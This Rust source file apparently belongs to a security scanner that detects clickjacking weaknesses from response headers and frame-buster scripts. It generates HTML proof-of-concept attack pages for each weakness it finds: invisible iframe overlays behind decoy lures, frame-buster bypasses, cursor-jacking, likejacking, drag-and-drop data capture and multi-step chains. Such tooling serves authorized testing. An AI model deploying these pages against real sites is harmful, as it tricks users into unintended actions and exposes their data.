/// Automated clickjacking vulnerability detection and PoC generation.
///
/// Covers X-Frame-Options analysis, CSP frame-ancestors, frame-buster bypasses,
/// double-click, drag-and-drop, cursor-jacking, likejacking, touch-based, and
/// multi-step clickjacking attack patterns.
use std::collections::HashSet;

/// Clickjacking vulnerability pattern detected on a target.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum ClickjackingPattern {
    MissingXfo,
    WeakXfo { value: String },
    MissingFrameAncestors,
    WildcardFrameAncestors,
    AllowFromDeprecated { origin: String },
    FrameBusterBypassable { technique: FrameBusterBypass },
    DoubleClickVulnerable,
    DragDropVulnerable,
    CursorJackingVulnerable,
    LikejackingVulnerable,
    TouchJackingVulnerable,
    MultiStepVulnerable { step_count: usize },
    ConflictingHeaders { xfo: String, csp_fa: String },
    SandboxBypass,
}

impl std::fmt::Display for ClickjackingPattern {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::MissingXfo => write!(f, "missing_xfo"),
            Self::WeakXfo { value } => write!(f, "weak_xfo:{value}"),
            Self::MissingFrameAncestors => write!(f, "missing_frame_ancestors"),
            Self::WildcardFrameAncestors => write!(f, "wildcard_frame_ancestors"),
            Self::AllowFromDeprecated { origin } => {
                write!(f, "allow_from_deprecated:{origin}")
            }
            Self::FrameBusterBypassable { technique } => {
                write!(f, "frame_buster_bypass:{technique}")
            }
            Self::DoubleClickVulnerable => write!(f, "double_click_vulnerable"),
            Self::DragDropVulnerable => write!(f, "drag_drop_vulnerable"),
            Self::CursorJackingVulnerable => write!(f, "cursor_jacking_vulnerable"),
            Self::LikejackingVulnerable => write!(f, "likejacking_vulnerable"),
            Self::TouchJackingVulnerable => write!(f, "touch_jacking_vulnerable"),
            Self::MultiStepVulnerable { step_count } => {
                write!(f, "multi_step_vulnerable:{step_count}")
            }
            Self::ConflictingHeaders { xfo, csp_fa } => {
                write!(f, "conflicting_headers:{xfo}|{csp_fa}")
            }
            Self::SandboxBypass => write!(f, "sandbox_bypass"),
        }
    }
}

/// Frame-buster bypass techniques.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum FrameBusterBypass {
    SandboxAttribute,
    OnBeforeUnload,
    DoubleFraming,
    XssFilter,
    RestrictedZone,
}

impl std::fmt::Display for FrameBusterBypass {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SandboxAttribute => write!(f, "sandbox_attribute"),
            Self::OnBeforeUnload => write!(f, "onbeforeunload"),
            Self::DoubleFraming => write!(f, "double_framing"),
            Self::XssFilter => write!(f, "xss_filter"),
            Self::RestrictedZone => write!(f, "restricted_zone"),
        }
    }
}

/// Severity score for a clickjacking pattern (CVSS-aligned, 0.0-10.0).
pub fn pattern_severity(pattern: &ClickjackingPattern) -> f64 {
    match pattern {
        ClickjackingPattern::MissingXfo => 5.0,
        ClickjackingPattern::WeakXfo { .. } => 4.5,
        ClickjackingPattern::MissingFrameAncestors => 5.5,
        ClickjackingPattern::WildcardFrameAncestors => 6.0,
        ClickjackingPattern::AllowFromDeprecated { .. } => 5.0,
        ClickjackingPattern::FrameBusterBypassable { .. } => 6.5,
        ClickjackingPattern::DoubleClickVulnerable => 7.0,
        ClickjackingPattern::DragDropVulnerable => 6.5,
        ClickjackingPattern::CursorJackingVulnerable => 7.0,
        ClickjackingPattern::LikejackingVulnerable => 5.5,
        ClickjackingPattern::TouchJackingVulnerable => 6.0,
        ClickjackingPattern::MultiStepVulnerable { .. } => 7.5,
        ClickjackingPattern::ConflictingHeaders { .. } => 5.0,
        ClickjackingPattern::SandboxBypass => 6.5,
    }
}

/// HTTP response headers relevant to clickjacking analysis.
#[derive(Debug, Clone, Default)]
pub struct ResponseHeaders {
    pub x_frame_options: Option<String>,
    pub content_security_policy: Option<String>,
    pub content_type: Option<String>,
}

/// Context for a page being analyzed.
#[derive(Debug, Clone)]
pub struct PageContext {
    pub url: String,
    pub headers: ResponseHeaders,
    pub body: String,
}

/// Generated proof-of-concept for a clickjacking vulnerability.
#[derive(Debug, Clone, PartialEq)]
pub struct ClickjackingPoc {
    pub pattern: ClickjackingPattern,
    pub html: String,
    pub description: String,
}

/// Result of a full clickjacking analysis.
#[derive(Debug, Clone)]
pub struct ClickjackingAnalysis {
    pub target_url: String,
    pub patterns: Vec<ClickjackingPattern>,
    pub pocs: Vec<ClickjackingPoc>,
}

/// Analyze a page for clickjacking vulnerabilities and generate PoCs.
pub fn analyze(ctx: &PageContext) -> ClickjackingAnalysis {
    let mut patterns = Vec::new();

    let header_patterns = analyze_headers(&ctx.headers);
    patterns.extend(header_patterns);

    let buster_patterns = detect_frame_busters(&ctx.body);
    patterns.extend(buster_patterns);

    if is_frameable(&ctx.headers) {
        patterns.push(ClickjackingPattern::DoubleClickVulnerable);

        if has_draggable_content(&ctx.body) {
            patterns.push(ClickjackingPattern::DragDropVulnerable);
        }

        patterns.push(ClickjackingPattern::CursorJackingVulnerable);

        if has_social_actions(&ctx.body) {
            patterns.push(ClickjackingPattern::LikejackingVulnerable);
        }

        patterns.push(ClickjackingPattern::TouchJackingVulnerable);
    }

    let deduped: Vec<ClickjackingPattern> = {
        let mut seen = HashSet::new();
        patterns
            .into_iter()
            .filter(|p| seen.insert(p.clone()))
            .collect()
    };

    let pocs: Vec<ClickjackingPoc> = deduped.iter().map(|p| generate_poc(&ctx.url, p)).collect();

    ClickjackingAnalysis {
        target_url: ctx.url.clone(),
        patterns: deduped,
        pocs,
    }
}

/// Analyze multi-step clickjacking across ordered URLs.
pub fn analyze_multi_step(pages: &[PageContext]) -> Option<ClickjackingPoc> {
    let frameable: Vec<&PageContext> = pages.iter().filter(|p| is_frameable(&p.headers)).collect();
    if frameable.len() < 2 {
        return None;
    }

    let pattern = ClickjackingPattern::MultiStepVulnerable {
        step_count: frameable.len(),
    };
    let urls: Vec<&str> = frameable.iter().map(|p| p.url.as_str()).collect();
    let poc = generate_multi_step_poc(&urls, &pattern);
    Some(poc)
}

/// Analyze response headers for clickjacking weaknesses.
pub(crate) fn analyze_headers(headers: &ResponseHeaders) -> Vec<ClickjackingPattern> {
    let mut findings = Vec::new();
    let frame_ancestors = headers
        .content_security_policy
        .as_deref()
        .and_then(extract_frame_ancestors);

    match (&headers.x_frame_options, &frame_ancestors) {
        (None, None) => {
            findings.push(ClickjackingPattern::MissingXfo);
            findings.push(ClickjackingPattern::MissingFrameAncestors);
        }
        (None, Some(_)) => {
            findings.push(ClickjackingPattern::MissingXfo);
        }
        (Some(_), None) => {
            findings.push(ClickjackingPattern::MissingFrameAncestors);
        }
        (Some(_), Some(_)) => {}
    }

    if let Some(xfo) = &headers.x_frame_options {
        let xfo_lower = xfo.trim().to_ascii_lowercase();
        if let Some(origin) = xfo_lower.strip_prefix("allow-from") {
            findings.push(ClickjackingPattern::AllowFromDeprecated {
                origin: origin.trim().to_string(),
            });
        } else if xfo_lower != "deny" && xfo_lower != "sameorigin" {
            findings.push(ClickjackingPattern::WeakXfo { value: xfo.clone() });
        }
    }

    if let Some(fa) = &frame_ancestors {
        let fa_trimmed = fa.trim();
        if fa_trimmed == "*" {
            findings.push(ClickjackingPattern::WildcardFrameAncestors);
        }
    }

    if let (Some(xfo), Some(fa)) = (&headers.x_frame_options, &frame_ancestors) {
        let xfo_lower = xfo.trim().to_ascii_lowercase();
        let fa_lower = fa.trim().to_ascii_lowercase();
        let xfo_denies = xfo_lower == "deny";
        let fa_allows = fa_lower != "'none'" && fa_lower != "'self'";
        let xfo_allows = xfo_lower == "sameorigin";
        let fa_denies = fa_lower == "'none'";
        if (xfo_denies && fa_allows) || (xfo_allows && fa_denies) {
            findings.push(ClickjackingPattern::ConflictingHeaders {
                xfo: xfo.clone(),
                csp_fa: fa.clone(),
            });
        }
    }

    findings
}

/// Detect JavaScript frame-buster scripts and determine bypasses.
pub(crate) fn detect_frame_busters(body: &str) -> Vec<ClickjackingPattern> {
    let mut findings = Vec::new();
    let lower = body.to_ascii_lowercase();

    let buster_signatures = [
        "top.location",
        "top.location.href",
        "parent.location",
        "self.location",
        "window.top",
        "if (top != self)",
        "if (top !== self)",
        "if (parent != self)",
        "if (parent !== self)",
        "if(top!=self)",
        "if(top!==self)",
        "top.location.replace",
    ];

    let has_buster = buster_signatures.iter().any(|sig| lower.contains(sig));

    if has_buster {
        findings.push(ClickjackingPattern::FrameBusterBypassable {
            technique: FrameBusterBypass::SandboxAttribute,
        });
        findings.push(ClickjackingPattern::FrameBusterBypassable {
            technique: FrameBusterBypass::OnBeforeUnload,
        });
        findings.push(ClickjackingPattern::FrameBusterBypassable {
            technique: FrameBusterBypass::DoubleFraming,
        });
        findings.push(ClickjackingPattern::SandboxBypass);
    }

    findings
}

/// Determine whether a page is frameable based on headers.
pub(crate) fn is_frameable(headers: &ResponseHeaders) -> bool {
    if let Some(xfo) = &headers.x_frame_options {
        let xfo_lower = xfo.trim().to_ascii_lowercase();
        if xfo_lower == "deny" {
            return false;
        }
    }

    if let Some(csp) = &headers.content_security_policy
        && let Some(fa) = extract_frame_ancestors(csp)
    {
        let fa_lower = fa.trim().to_ascii_lowercase();
        if fa_lower == "'none'" || fa_lower == "'self'" {
            return false;
        }
    }

    true
}

/// Check for draggable content (forms, inputs, text areas).
fn has_draggable_content(body: &str) -> bool {
    let lower = body.to_ascii_lowercase();
    lower.contains("<input") || lower.contains("<textarea") || lower.contains("draggable")
}

/// Check for social media action elements (like buttons, share widgets).
fn has_social_actions(body: &str) -> bool {
    let lower = body.to_ascii_lowercase();
    let social_indicators = [
        "fb-like",
        "fb:like",
        "twitter-share",
        "tweet-button",
        "like-button",
        "share-button",
        "social-share",
        "btn-like",
        "js-like",
        "data-action=\"like\"",
    ];
    social_indicators
        .iter()
        .any(|indicator| lower.contains(indicator))
}

fn extract_frame_ancestors(csp: &str) -> Option<String> {
    let lower = csp.to_ascii_lowercase();
    for directive in lower.split(';') {
        let trimmed = directive.trim();
        if let Some(value) = trimmed.strip_prefix("frame-ancestors") {
            let val = value.trim();
            if !val.is_empty() {
                return Some(val.to_string());
            }
        }
    }
    None
}

/// Generate an HTML PoC for a specific clickjacking pattern.
pub fn generate_poc(target_url: &str, pattern: &ClickjackingPattern) -> ClickjackingPoc {
    let (html, description) = match pattern {
        ClickjackingPattern::MissingXfo | ClickjackingPattern::MissingFrameAncestors => (
            generate_basic_iframe_poc(target_url),
            "Basic iframe overlay — target lacks frame protection headers".to_string(),
        ),
        ClickjackingPattern::WeakXfo { value } => (
            generate_basic_iframe_poc(target_url),
            format!("Weak X-Frame-Options value ({value}) allows framing"),
        ),
        ClickjackingPattern::WildcardFrameAncestors => (
            generate_basic_iframe_poc(target_url),
            "CSP frame-ancestors wildcard (*) allows framing from any origin".to_string(),
        ),
        ClickjackingPattern::AllowFromDeprecated { origin } => (
            generate_basic_iframe_poc(target_url),
            format!("Deprecated ALLOW-FROM ({origin}) — unsupported in modern browsers"),
        ),
        ClickjackingPattern::FrameBusterBypassable { technique } => {
            let html = match technique {
                FrameBusterBypass::SandboxAttribute => generate_sandbox_bypass_poc(target_url),
                FrameBusterBypass::OnBeforeUnload => generate_onbeforeunload_bypass_poc(target_url),
                FrameBusterBypass::DoubleFraming => generate_double_framing_poc(target_url),
                FrameBusterBypass::XssFilter => generate_xss_filter_bypass_poc(target_url),
                FrameBusterBypass::RestrictedZone => generate_basic_iframe_poc(target_url),
            };
            (
                html,
                format!("Frame-buster bypass using {technique} technique"),
            )
        }
        ClickjackingPattern::DoubleClickVulnerable => (
            generate_double_click_poc(target_url),
            "Double-click clickjacking — intercept first click, pass second to iframe".to_string(),
        ),
        ClickjackingPattern::DragDropVulnerable => (
            generate_drag_drop_poc(target_url),
            "HTML5 drag-and-drop jacking — extract data via cross-origin drag".to_string(),
        ),
        ClickjackingPattern::CursorJackingVulnerable => (
            generate_cursor_jacking_poc(target_url),
            "Cursor jacking — reposition visible cursor away from actual click target".to_string(),
        ),
        ClickjackingPattern::LikejackingVulnerable => (
            generate_likejacking_poc(target_url),
            "Likejacking — invisible social action button under decoy content".to_string(),
        ),
        ClickjackingPattern::TouchJackingVulnerable => (
            generate_touch_jacking_poc(target_url),
            "Touch-based clickjacking — mobile tap-jacking via invisible overlay".to_string(),
        ),
        ClickjackingPattern::MultiStepVulnerable { step_count } => (
            generate_multi_step_single_poc(target_url, *step_count),
            format!("Multi-step clickjacking — {step_count} chained framed actions"),
        ),
        ClickjackingPattern::ConflictingHeaders { xfo, csp_fa } => (
            generate_basic_iframe_poc(target_url),
            format!("Conflicting frame policies: XFO={xfo}, CSP frame-ancestors={csp_fa}"),
        ),
        ClickjackingPattern::SandboxBypass => (
            generate_sandbox_bypass_poc(target_url),
            "Sandbox attribute bypass — iframe sandbox neutralizes frame-buster scripts"
                .to_string(),
        ),
    };

    ClickjackingPoc {
        pattern: pattern.clone(),
        html,
        description,
    }
}

fn generate_basic_iframe_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title>
<style>
  .overlay {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    opacity: 0.0001; z-index: 2; }}
  .decoy {{ position: absolute; top: 50px; left: 50px; z-index: 1;
    font-size: 24px; cursor: pointer; }}
  iframe {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    border: none; opacity: 0.0001; z-index: 2; }}
</style></head>
<body>
  <div class="decoy">Click here to win a prize!</div>
  <iframe src="{target}"></iframe>
</body>
</html>"#
    )
}

fn generate_sandbox_bypass_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Sandbox Bypass PoC</title>
<style>
  .decoy {{ position: absolute; top: 100px; left: 100px; z-index: 1;
    font-size: 24px; cursor: pointer; }}
  iframe {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    border: none; opacity: 0.0001; z-index: 2; }}
</style></head>
<body>
  <div class="decoy">Click to continue</div>
  <iframe src="{target}" sandbox="allow-forms allow-same-origin"></iframe>
</body>
</html>"#
    )
}

fn generate_onbeforeunload_bypass_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>OnBeforeUnload Bypass PoC</title>
<style>
  iframe {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    border: none; opacity: 0.0001; z-index: 2; }}
  .decoy {{ position: absolute; top: 80px; left: 80px; z-index: 1;
    font-size: 24px; cursor: pointer; }}
</style>
<script>
  window.onbeforeunload = function() {{ return ""; }};
</script></head>
<body>
  <div class="decoy">Verify your identity</div>
  <iframe src="{target}"></iframe>
</body>
</html>"#
    )
}

fn generate_double_framing_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Double Framing PoC</title></head>
<body>
  <iframe id="outer" style="width:100%;height:100%;border:none;">
  </iframe>
  <script>
    var outer = document.getElementById('outer');
    var doc = outer.contentDocument || outer.contentWindow.document;
    doc.open();
    doc.write('<iframe src="{target}" style="width:100%;height:100%;border:none;"></iframe>');
    doc.close();
  </script>
</body>
</html>"#
    )
}

fn generate_xss_filter_bypass_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>XSS Filter Bypass PoC</title>
<style>
  iframe {{ width: 100%; height: 100%; border: none; opacity: 0.0001;
    position: absolute; top: 0; left: 0; z-index: 2; }}
  .decoy {{ position: absolute; top: 60px; left: 60px; z-index: 1;
    font-size: 24px; }}
</style></head>
<body>
  <div class="decoy">Security verification required</div>
  <iframe src="{target}?x=%3Cscript%3Eif(top!=self){{top.location=self.location}}%3C/script%3E"></iframe>
</body>
</html>"#
    )
}

fn generate_double_click_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Double-Click Clickjacking PoC</title>
<style>
  #decoy {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    z-index: 3; background: white; cursor: pointer; display: flex;
    align-items: center; justify-content: center; font-size: 28px; }}
  iframe {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    border: none; z-index: 1; }}
</style>
<script>
  var clickCount = 0;
  function handleClick() {{
    clickCount++;
    if (clickCount === 1) {{
      document.getElementById('decoy').style.display = 'none';
    }}
  }}
</script></head>
<body>
  <div id="decoy" ondblclick="handleClick()">Double-click to verify you are human</div>
  <iframe src="{target}"></iframe>
</body>
</html>"#
    )
}

fn generate_drag_drop_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Drag-and-Drop Jacking PoC</title>
<style>
  #drop-zone {{ width: 300px; height: 200px; border: 2px dashed #999;
    margin: 20px auto; text-align: center; padding-top: 80px;
    font-size: 18px; position: relative; z-index: 3; }}
  iframe {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    border: none; opacity: 0.0001; z-index: 2; pointer-events: none; }}
</style>
<script>
  var dz = null;
  window.onload = function() {{
    dz = document.getElementById('drop-zone');
    dz.addEventListener('dragover', function(e) {{ e.preventDefault(); }});
    dz.addEventListener('drop', function(e) {{
      e.preventDefault();
      var data = e.dataTransfer.getData('text/html');
      document.getElementById('exfil').value = data;
    }});
  }};
</script></head>
<body>
  <div id="drop-zone">Drop files here to upload</div>
  <input type="hidden" id="exfil">
  <iframe src="{target}"></iframe>
</body>
</html>"#
    )
}

fn generate_cursor_jacking_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Cursor Jacking PoC</title>
<style>
  body {{ cursor: none; }}
  #fake-cursor {{ position: absolute; width: 16px; height: 16px;
    background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"><polygon points="0,0 0,14 4,10 7,16 9,15 6,9 12,9" fill="black" stroke="white"/></svg>');
    pointer-events: none; z-index: 999; }}
  iframe {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    border: none; opacity: 0.0001; z-index: 2; }}
  .decoy {{ position: absolute; top: 100px; left: 300px; z-index: 1;
    font-size: 24px; }}
</style>
<script>
  var offsetX = 200, offsetY = 150;
  document.addEventListener('mousemove', function(e) {{
    var fc = document.getElementById('fake-cursor');
    fc.style.left = (e.clientX + offsetX) + 'px';
    fc.style.top = (e.clientY + offsetY) + 'px';
  }});
</script></head>
<body>
  <div id="fake-cursor"></div>
  <div class="decoy">Click the button below</div>
  <iframe src="{target}"></iframe>
</body>
</html>"#
    )
}

fn generate_likejacking_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Likejacking PoC</title>
<style>
  .bait {{ position: absolute; top: 50px; left: 50px; z-index: 1;
    font-size: 28px; cursor: pointer; padding: 20px;
    background: #4267B2; color: white; border-radius: 8px; }}
  iframe {{ position: absolute; top: 50px; left: 50px; width: 300px;
    height: 80px; border: none; opacity: 0.0001; z-index: 2; }}
</style></head>
<body>
  <div class="bait">Watch Exclusive Video</div>
  <iframe src="{target}" scrolling="no"></iframe>
</body>
</html>"#
    )
}

fn generate_touch_jacking_poc(target: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Touch Jacking PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  .tap-target {{ position: absolute; top: 50%; left: 50%;
    transform: translate(-50%, -50%); z-index: 1; font-size: 22px;
    padding: 30px 50px; background: #28a745; color: white;
    border-radius: 12px; -webkit-tap-highlight-color: transparent; }}
  iframe {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    border: none; opacity: 0.0001; z-index: 2;
    -webkit-overflow-scrolling: touch; }}
</style></head>
<body>
  <div class="tap-target">Tap to Claim Reward</div>
  <iframe src="{target}"></iframe>
</body>
</html>"#
    )
}

fn generate_multi_step_single_poc(target: &str, steps: usize) -> String {
    let mut step_divs = String::new();
    for i in 0..steps {
        let top = 50 + i * 80;
        step_divs.push_str(&format!(
            r#"  <div class="step" id="step{i}" style="top:{top}px;"
    onclick="advanceStep({i})">Step {n}: Click to continue</div>
"#,
            i = i,
            n = i + 1,
            top = top,
        ));
    }

    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Multi-Step Clickjacking PoC</title>
<style>
  .step {{ position: absolute; left: 50px; z-index: 1; font-size: 20px;
    padding: 15px 30px; background: #007bff; color: white; cursor: pointer;
    border-radius: 6px; }}
  iframe {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
    border: none; opacity: 0.0001; z-index: 2; }}
</style>
<script>
  var currentStep = 0;
  function advanceStep(step) {{
    if (step === currentStep) {{
      document.getElementById('step' + step).style.display = 'none';
      currentStep++;
    }}
  }}
</script></head>
<body>
{step_divs}  <iframe src="{target}"></iframe>
</body>
</html>"#,
        step_divs = step_divs,
        target = target,
    )
}

fn generate_multi_step_poc(urls: &[&str], pattern: &ClickjackingPattern) -> ClickjackingPoc {
    let mut iframes = String::new();
    let mut step_divs = String::new();

    for (i, url) in urls.iter().enumerate() {
        let top = 50 + i * 80;
        iframes.push_str(&format!(
            r#"  <iframe id="frame{i}" src="{url}" style="display:{display};position:absolute;
    top:0;left:0;width:100%;height:100%;border:none;opacity:0.0001;z-index:2;"></iframe>
"#,
            i = i,
            url = url,
            display = if i == 0 { "block" } else { "none" },
        ));
        step_divs.push_str(&format!(
            r#"  <div class="step" id="step{i}" style="top:{top}px;{display}"
    onclick="nextFrame({i})">Step {n}: Click here</div>
"#,
            i = i,
            top = top,
            n = i + 1,
            display = if i == 0 { "" } else { "display:none;" },
        ));
    }

    let html = format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Multi-Step Clickjacking PoC</title>
<style>
  .step {{ position: absolute; left: 50px; z-index: 1; font-size: 20px;
    padding: 15px 30px; background: #dc3545; color: white; cursor: pointer;
    border-radius: 6px; }}
</style>
<script>
  function nextFrame(idx) {{
    document.getElementById('step' + idx).style.display = 'none';
    document.getElementById('frame' + idx).style.display = 'none';
    var next = idx + 1;
    var nextStep = document.getElementById('step' + next);
    var nextFrame = document.getElementById('frame' + next);
    if (nextStep) nextStep.style.display = 'block';
    if (nextFrame) nextFrame.style.display = 'block';
  }}
</script></head>
<body>
{step_divs}{iframes}</body>
</html>"#,
        step_divs = step_divs,
        iframes = iframes,
    );

    ClickjackingPoc {
        pattern: pattern.clone(),
        html,
        description: format!(
            "Multi-step clickjacking chain across {} targets",
            urls.len()
        ),
    }
}
